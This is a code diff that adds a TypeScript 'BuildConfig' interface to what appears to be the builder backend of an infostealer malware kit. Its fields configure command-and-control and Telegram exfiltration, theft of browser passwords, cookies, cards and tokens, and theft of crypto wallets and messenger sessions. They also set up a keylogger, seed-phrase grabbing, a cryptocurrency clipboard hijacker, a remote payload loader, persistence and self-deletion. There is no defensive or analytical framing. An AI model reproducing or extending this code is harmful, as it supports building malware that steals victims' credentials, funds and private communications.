@@ -89,6 +89,28 @@ export interface BuildRecord {
   download_count: number
   created_at: string
 }
+export interface BuildConfig {
+  build_name: string; build_tag: string
+  icon_data?: number[]; manifest_xml?: number[]
+  c2_host: string; c2_port: number; c2_token: string
+  telegram_token: string; telegram_chat_id: string
+  anti_duplicate: { ban_hwid: boolean; ban_ip: boolean; ban_timeout_h: number }
+  proxy_gate: { enabled: boolean; type: string; source_id: string }
+  modules: {
+    chromium: { enabled: boolean; passwords: boolean; cookies: boolean; cards: boolean; history: boolean; autofill: boolean; bookmarks: boolean; google_tokens: boolean; cdp_grab: boolean; raw_export: boolean; kill_browsers: boolean }
+    firefox: { enabled: boolean; passwords: boolean; cookies: boolean; history: boolean }
+    wallets: boolean; gaming: boolean; vpn: boolean; twofa: boolean; passman: boolean
+    messengers: { discord: boolean; telegram: boolean; telegram_clients: string[]; signal: boolean; whatsapp: boolean; skype: boolean; viber: boolean; element: boolean; session: boolean; tox: boolean; icq: boolean; pidgin: boolean; outlook: boolean }
+    system: { system_info: boolean; wifi: boolean; screenshot: boolean; keylogger: boolean; seed_grabber: boolean; clipboard: boolean }
+    clipper: { enabled: boolean; coins: string[]; btc_addr: string; eth_addr: string; trx_addr: string; xmr_addr: string; sol_addr: string; ton_addr: string }
+    grabber: { enabled: boolean; extensions: string[]; max_size_mb: number; max_depth: number; paths: string[] }
+    loader: { enabled: boolean; url: string }
+  }
+  persistence: boolean; self_delete: boolean
+  startup_delay_ms: number
+  socks5_host: string; socks5_port: number
+  include_decryptor: boolean
+}
 
 export interface BuildResponse {
   build_id: string
